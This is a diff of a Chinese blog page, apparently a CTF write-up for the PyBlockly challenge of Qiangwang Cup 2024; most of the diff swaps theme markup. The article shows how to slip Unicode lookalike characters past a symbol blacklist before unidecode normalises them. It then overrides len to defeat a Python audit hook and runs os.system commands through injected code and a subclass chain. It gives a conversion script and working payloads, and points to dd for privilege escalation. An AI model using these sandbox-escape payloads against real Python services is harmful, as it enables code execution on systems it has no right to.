@@ -1,385 +1,369 @@
-<!--
-	作者：Sariay
-	时间：2018-08-26
-	描述：There may be a bug, but don't worry, Qiling(器灵) says that it can work normally! aha!
--->
+
+
 <!DOCTYPE html>
-<html class="html-loading">
-		
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
 
 <head>
-	<meta charset="utf-8">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1.0, user-scalable=no">
-  <title>
-    
-      强网杯2024 | Infernity&#39;s Blog
-    
-  </title>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/I.png">
+  <link rel="icon" href="/img/I.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
   <meta name="author" content="Infernity">
-  <meta name="keywords" content="" />
-  <meta name="description" content="blog" />
-	<!-- favicon -->
-  <link rel="shortcut icon" href="/img/I.png">
-
-  <!-- css -->
+  <meta name="keywords" content="">
   
-<link rel="stylesheet" href="/css/Annie.css">
-
+    <meta name="description" content="PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字， 1234if check_for_blacklisted_symbols(block[&amp;#x27;fields&amp;#x27;][&amp;#x27;TEXT&amp;#x27;]):    code &#x3D; &amp;#x27;&amp;#x27;else:    code &#x3D; &quot;&amp;#x27;&quot; + unidecode.unidecode(b">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2024">
+<meta property="og:url" content="http://example.com/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/index.html">
+<meta property="og:site_name" content="Infernity&#39;s Blog">
+<meta property="og:description" content="PyBlockly黑名单过滤了所有符号，只能在print里用字母和数字， 1234if check_for_blacklisted_symbols(block[&amp;#x27;fields&amp;#x27;][&amp;#x27;TEXT&amp;#x27;]):    code &#x3D; &amp;#x27;&amp;#x27;else:    code &#x3D; &quot;&amp;#x27;&quot; + unidecode.unidecode(b">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/qwb2024/qwb2024.png">
+<meta property="article:published_time" content="2024-11-03T08:40:19.000Z">
+<meta property="article:modified_time" content="2025-01-20T02:37:27.773Z">
+<meta property="article:author" content="Infernity">
+<meta property="article:tag" content="WPs">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/img/qwb2024/qwb2024.png">
   
-  <!-- jquery -->
-	
-<script src="/plugin/jquery/jquery.min.js"></script>
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>强网杯2024 - Infernity&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
 
-<script>
-    const CONFIG_BGIMAGE = {
-      mode: 'random_you',
-      normalSrc: '/img/header-bg.jpg',
-      randomYouMax: 59,
-      randomYouSrc: '/img/background/',
-	  randomOtherSrc: 'https://api.berryapi.net/?service=App.Bing.Images&day=-0',
-	  preloaderEnable: true
-    }
-	
-    const CONFIG_LEACLOUD_COUNT = {
-      enable: true,
-	  appId: 'AU8',
-	  appKey: '4cU',
-	  serverURLs: 'http' || ' '
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":150,"cursorChar":"_","loop":true,"scope":["home"]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"§"},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
     }
   </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
 <meta name="generator" content="Hexo 6.3.0"></head>
-	<body>
-		<!-- Preloader -->
-
-	<div id="preloader">
-		<div class="pre-container">
-			
-				<div class="spinner">
-					<div class="double-bounce1"></div>
-					<div class="double-bounce2"></div>
-				</div>
-						
-		</div>
-	</div>
 
 
-<!-- header -->
-<header class="fixbackground bg-pan-br">
-	<div class="mask">
-		<!-- motto -->
-		<div class="h-body">	
-			
-				<div class="motto text-shadow-pop-left">
-					<p class="content" id="motto-content">获取中...</p>
-					<p>-<p>
-					<p class="author" id="motto-author">Just a minute...</p>
-				</div>
-			
-		</div>
-		
-		<!-- others: such as time... -->			
-		<div class="h-footer">
-			<a href="javascript:;" id="read-more" class="scroll-down">
-				<span class="icon-anchor1 animation-scroll-down"></span>
-			</a>
-		</div>
-	</div>
-</header>
+<body>
+  
 
-<div id="navigation-hide">
-	<!-- Progress bar -->
-	<div id="progress-bar"></div>
-
-	<!-- Progress percent -->
-	<div id="progress-percentage"><span>0.0%</span></div>
-
-	<div class="toc-switch"><span class="switch-button">目录</span></div>
-
-	<!-- Page title -->
-	<p>
-		
-			「强网杯2024」
-		
-	</p>
-
-	
-	
-		<span id="star-button" rel="unlike">
-			<i class="icon-heart"></i>
-		</span>
-	
-
-	<!-- Nav trigger for navigation-H-->
-	<a class="nav-trigger"><span></span></a>
-</div>
-
-<!-- Navigation in div(id="navigation-H") -->
-<nav class="nav-container" id="cd-nav">
-	<div class="nav-header">
-		<span class="logo"> 
-			<img src="/img/logo.png">
-		</span>
-		<a href="javascript:;" class="nav-close"></a>
-	</div>
-	
-	<div class="nav-body">
-		<ul id="global-nav">
-	
-		<li class="menu-home">
-			<a href="/" class="menu-item-home" target="_blank">主页</a>
-		</li>
-		
-	
-		<li class="menu-archive">
-			<a href="/archives" class="menu-item-archive" target="_blank">归档</a>
-		</li>
-		
-	
-		<li class="menu-categories">
-			<a href="/categories" class="menu-item-categories" target="_blank">分类</a>
-		</li>
-		
-	
-		<li class="menu-tags">
-			<a href="/tags" class="menu-item-tags" target="_blank">标签</a>
-		</li>
-		
-	
-		<li class="menu-Friends!">
-			<a href="/friends" class="menu-item-Friends!" target="_blank">Friends!</a>
-		</li>
-		
-	
-		<li class="menu-gallery">
-			<a href="/gallery" class="menu-item-gallery" target="_blank">相册</a>
-		</li>
-		
-	
-
-	
-</ul>
-	</div>
-	
-	<div class="nav-footer">
-		<ul id="global-social">
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-one"><span class="path1"></span><span class="path2"></span></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/qq.png" target="_blank">
-				<span class="icon-qq"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://github.com/CyberPunk-Infernity" target="_blank">
-				<span class="icon-github"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/img/weixin.jpg" target="_blank">
-				<span class="icon-weixin"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="https://blog.csdn.net/qq_39591427?spm=1000.2115.3001.5343" target="_blank">
-				<span class="icon-csdn"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-instagram"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="http://github.com/" target="_blank">
-				<span class="icon-twitter"></span>
-			</a>
-		</li>
-	
-		<li>
-			<a href="/atom.xml" target="_blank">
-				<span class="icon-rss"></span>
-			</a>
-		</li>
-			
-</ul>
-
-	</div>
-</nav>
-			
-		<!--main-->
-		<main>
-			<!--
-	时间：2018-11-17
-	描述：
-		插件名称：katelog.min.js
-		插件作者：KELEN
-		插件来源: https://github.com/KELEN/katelog
--->
-
-	
-		<div class="layout-toc">
-			<div id="layout-toc">
-				<div class="k-catelog-list" id="catelog-list" data-title="文章目录"></div>
-			</div>
-		</div>
-
-		
-<script src="/plugin/toc/katelog.min.js"></script>
-
-
-		
-	 
-
-<div class="layout-post">
-	<div id="layout-post">
-		<div class="article-title">
-			
-	<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" itemprop="url">
-		强网杯2024
-	</a>
-
-		</div>
-
-		<div class="article-meta">
-			<span>
-				<i class="icon-calendar1"></i>
-				
-				
-
-
-
-
-	更新于
-
-	<a href="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" itemprop="url">
-		<time datetime="2024-11-03T08:40:19.000Z" itemprop="dateUpdated">
-	  		2024-11-03
-	  </time>
-	</a> 
-
-
-
-			</span>
-			<span>
-				
-	<i class="icon-price-tags"></i>
-	
-		<a href="/tags/WPs/" class=" ">
-			WPs
-		</a>
-	
-		
-			</span>
-			
-			
-
-	
-    <span class="leancloud_visitors" id="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/_visitors" data-url="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" data-title="强网杯2024">
-       	<i class="icon-eye"></i>
-       	热度
-        
-            <i class="leancloud_visitors_count" id="leancloud_visitors_count">1</i>
-                   
-    </span>
+  <header>
     
 
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Infernity&#39;s blog</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/friends/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>friends</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/background/19.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">强网杯2024</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-11-03 16:40" pubdate>
+          2024年11月3日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          22 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
 
 
-	
-    <span class="leancloud_likes" id="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/_likes" data-url="/2024/11/03/%E5%BC%BA%E7%BD%91%E6%9D%AF2024/" data-title="强网杯2024" rel="unlike">
-        <i class="icon-heart"></i>
-        喜欢
-        <i class="leancloud_likes_count" id="leancloud_likes_count">0</i>
-    </span>
-	
+        
+      </div>
 
-		</div>
+      
+    </div>
+  </div>
+</div>
 
-		<div class="article-content" id="article-content">
-			<h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>黑名单过滤了所有符号，只能在print里用字母和数字，</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> check_for_blacklisted_symbols(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]):</span><br><span class="line">    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    code = <span class="string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="string">&#x27;fields&#x27;</span>][<span class="string">&#x27;TEXT&#x27;</span>]) + <span class="string">&quot;&#x27;&quot;</span></span><br></pre></td></tr></table></figure>
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">强网杯2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="PyBlockly"><a href="#PyBlockly" class="headerlink" title="PyBlockly"></a>PyBlockly</h1><p>黑名单过滤了所有符号，只能在print里用字母和数字，</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> check_for_blacklisted_symbols(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]):<br>    code = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">else</span>:<br>    code = <span class="hljs-string">&quot;&#x27;&quot;</span> + unidecode.unidecode(block[<span class="hljs-string">&#x27;fields&#x27;</span>][<span class="hljs-string">&#x27;TEXT&#x27;</span>]) + <span class="hljs-string">&quot;&#x27;&quot;</span><br></code></pre></td></tr></table></figure>
 
 <p>但是由于unidecode函数，能够将 Unicode 字符转换为<strong>最相似的 ASCII 字符</strong>。</p>
 <p>这里是先检测黑名单，再转化，那么我们可以找到与我们需要的字符最相似的字符，就可以绕过过滤，然后经过unidecode函数转化，就变成我们想要的ascii字符了。</p>
 <p>然后由于这里是拼接字符串，我们可以逃逸出去执行任意python代码。</p>
 <p>举个栗子：我传入<code>a&#39;)\nprint(&quot;Infernity&quot;)#</code>，经过拼接之后就变成了：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print(&#x27;a&#x27;)</span><br><span class="line">print(&quot;Infernity&quot;)#&#x27;)</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&#x27;a&#x27;</span>)</span></span><br><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(<span class="hljs-string">&quot;Infernity&quot;</span>)</span></span>#<span class="hljs-string">&#x27;)</span><br></code></pre></td></tr></table></figure>
 
 <p>就会回显<code>a</code>和<code>Infernity</code>。我们再把特殊字符找到它最相似的字符：比如<code>(</code>换成<code>⁽</code>，<code>#</code>换成<code>﹟</code>。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a＇⁾\nprint⁽＂Infernity＂⁾﹟</span><br></pre></td></tr></table></figure>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span>＇⁾\nprint⁽＂Infernity＂⁾﹟<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/image-20241102125723325.png" alt="image-20241102125723325"></p>
+<p><img src="/img/qwb2024/image-20241102125723325.png" srcset="/img/loading.gif" lazyload alt="image-20241102125723325"></p>
 <p>方便后续转换，这里贴一个脚本：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(text.replace(<span class="string">&#x27;_&#x27;</span>,<span class="string">&#x27;＿&#x27;</span>).replace(<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;⁽&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;⁾&#x27;</span>).replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;＇&#x27;</span>).replace(<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;﹟&#x27;</span>).replace(<span class="string">&#x27;[&#x27;</span>,<span class="string">&#x27;［&#x27;</span>).replace(<span class="string">&#x27;]&#x27;</span>,<span class="string">&#x27;］&#x27;</span>).replace(<span class="string">&#x27;=&#x27;</span>,<span class="string">&#x27;⁼&#x27;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&#x27;＂&#x27;</span>).replace(<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;․&#x27;</span>).replace(<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;：&#x27;</span>).replace(<span class="string">&#x27;/&#x27;</span>,<span class="string">&#x27;／&#x27;</span>).replace(<span class="string">&#x27;-&#x27;</span>,<span class="string">&#x27;－&#x27;</span>).replace(<span class="string">&#x27;&gt;&#x27;</span>,<span class="string">&#x27;﹥&#x27;</span>))</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">text = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-built_in">print</span>(text.replace(<span class="hljs-string">&#x27;_&#x27;</span>,<span class="hljs-string">&#x27;＿&#x27;</span>).replace(<span class="hljs-string">&#x27;(&#x27;</span>,<span class="hljs-string">&#x27;⁽&#x27;</span>).replace(<span class="hljs-string">&#x27;)&#x27;</span>,<span class="hljs-string">&#x27;⁾&#x27;</span>).replace(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>,<span class="hljs-string">&#x27;＇&#x27;</span>).replace(<span class="hljs-string">&#x27;#&#x27;</span>,<span class="hljs-string">&#x27;﹟&#x27;</span>).replace(<span class="hljs-string">&#x27;[&#x27;</span>,<span class="hljs-string">&#x27;［&#x27;</span>).replace(<span class="hljs-string">&#x27;]&#x27;</span>,<span class="hljs-string">&#x27;］&#x27;</span>).replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;⁼&#x27;</span>).replace(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;＂&#x27;</span>).replace(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-string">&#x27;․&#x27;</span>).replace(<span class="hljs-string">&#x27;:&#x27;</span>,<span class="hljs-string">&#x27;：&#x27;</span>).replace(<span class="hljs-string">&#x27;/&#x27;</span>,<span class="hljs-string">&#x27;／&#x27;</span>).replace(<span class="hljs-string">&#x27;-&#x27;</span>,<span class="hljs-string">&#x27;－&#x27;</span>).replace(<span class="hljs-string">&#x27;&gt;&#x27;</span>,<span class="hljs-string">&#x27;﹥&#x27;</span>))<br></code></pre></td></tr></table></figure>
 
 <p>现在绕过第一步了，第二步到了要rce的地方</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">my_audit_hook</span>(<span class="params">event_name, arg</span>):</span><br><span class="line">    blacklist = [<span class="string">&quot;popen&quot;</span>, <span class="string">&quot;input&quot;</span>, <span class="string">&quot;eval&quot;</span>, <span class="string">&quot;exec&quot;</span>, <span class="string">&quot;compile&quot;</span>, <span class="string">&quot;memoryview&quot;</span>]</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(event_name) &gt; <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Too Long!&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> bad <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> bad <span class="keyword">in</span> event_name:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;No!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_audit_hook</span>(<span class="hljs-params">event_name, arg</span>):<br>    blacklist = [<span class="hljs-string">&quot;popen&quot;</span>, <span class="hljs-string">&quot;input&quot;</span>, <span class="hljs-string">&quot;eval&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-string">&quot;compile&quot;</span>, <span class="hljs-string">&quot;memoryview&quot;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(event_name) &gt; <span class="hljs-number">4</span>:<br>        <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;Too Long!&quot;</span>)<br>    <span class="hljs-keyword">for</span> bad <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> bad <span class="hljs-keyword">in</span> event_name:<br>            <span class="hljs-keyword">raise</span> RuntimeError(<span class="hljs-string">&quot;No!&quot;</span>)<br><br><br><span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>).addaudithook(my_audit_hook)<br></code></pre></td></tr></table></figure>
 
 <p>我们传入的东西都会进这个hook，AST 沙箱会将用户的输入转化为操作码，此时字符串层面的变换基本上没用了。但是这里没有过滤os和system，所以我们可以直接<code>__import__(&quot;os&quot;).system(&quot;whoami&quot;)</code></p>
 <p>但是len(event_name)有限制，会检测os.system，我们的长度肯定是超过了的。</p>
 <p>但是我们可以通过覆盖len函数，来绕过长度限制：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__builtins__.<span class="built_in">len</span> = <span class="keyword">lambda</span> x:<span class="number">1</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">__builtins__.<span class="hljs-built_in">len</span> = <span class="hljs-keyword">lambda</span> x:<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
 
 <p>然后直接rce了（直接import可能会有问题，但是我本地可以，远程可以用继承链打。）</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a＇⁾\n＿＿builtins＿＿․<span class="built_in">len</span> ⁼ <span class="keyword">lambda</span> x：<span class="number">1</span>\n＿＿<span class="keyword">import</span>＿＿⁽＇os＇⁾․system⁽＇whoami＇⁾﹟</span><br></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">a＇⁾\n＿＿builtins＿＿․<span class="hljs-built_in">len</span> ⁼ <span class="hljs-keyword">lambda</span> x：<span class="hljs-number">1</span>\n＿＿<span class="hljs-keyword">import</span>＿＿⁽＇os＇⁾․system⁽＇whoami＇⁾﹟<br></code></pre></td></tr></table></figure>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a＇⁾＃\n＿＿builtins＿＿․len ⁼ lambda x：1\n\n［ x․＿＿init＿＿․＿＿globals＿＿ for x in ＇＇․＿＿class＿＿․＿＿base＿＿․＿＿subclasses＿＿⁽⁾ if x․＿＿name＿＿⁼⁼＂＿wrap＿close＂］［0］［＂system＂］⁽＂ls ／－al＂⁾＃</span><br></pre></td></tr></table></figure>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs angelscript">a＇⁾＃\n＿＿builtins＿＿․len ⁼ lambda x：<span class="hljs-number">1</span>\n\n［ x․＿＿init＿＿․＿＿globals＿＿ <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> ＇＇․＿＿<span class="hljs-keyword">class</span>＿＿․＿＿<span class="hljs-symbol">base</span>＿＿․＿＿<span class="hljs-symbol">subclasses</span>＿＿⁽⁾ <span class="hljs-symbol">if</span> <span class="hljs-symbol">x</span>․＿＿<span class="hljs-symbol">name</span>＿＿⁼⁼＂＿<span class="hljs-symbol">wrap</span>＿<span class="hljs-symbol">close</span>＂］［<span class="hljs-symbol">0</span>］［＂<span class="hljs-symbol">system</span>＂］⁽＂<span class="hljs-symbol">ls</span> ／－<span class="hljs-symbol">al</span>＂⁾＃<br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/b017e470-feda-4a53-96d2-90a7133a1505.png" alt="b017e470-feda-4a53-96d2-90a7133a1505"></p>
+<p><img src="/img/qwb2024/b017e470-feda-4a53-96d2-90a7133a1505.png" srcset="/img/loading.gif" lazyload alt="b017e470-feda-4a53-96d2-90a7133a1505"></p>
 <p>需要提权</p>
-<p><img src="/img/qwb2024/cd60b7cd-e902-477d-ab12-d4fe477b4460.png" alt="cd60b7cd-e902-477d-ab12-d4fe477b4460"></p>
+<p><img src="/img/qwb2024/cd60b7cd-e902-477d-ab12-d4fe477b4460.png" srcset="/img/loading.gif" lazyload alt="cd60b7cd-e902-477d-ab12-d4fe477b4460"></p>
 <p>参考gtfobins： <a target="_blank" rel="noopener" href="https://r0yanx.com/gtfobins/dd/">https://r0yanx.com/gtfobins/dd/</a></p>
-<p><img src="/img/qwb2024/f1abf556-2db2-48f5-9881-8557a07d55a7.png" alt="f1abf556-2db2-48f5-9881-8557a07d55a7"></p>
+<p><img src="/img/qwb2024/f1abf556-2db2-48f5-9881-8557a07d55a7.png" srcset="/img/loading.gif" lazyload alt="f1abf556-2db2-48f5-9881-8557a07d55a7"></p>
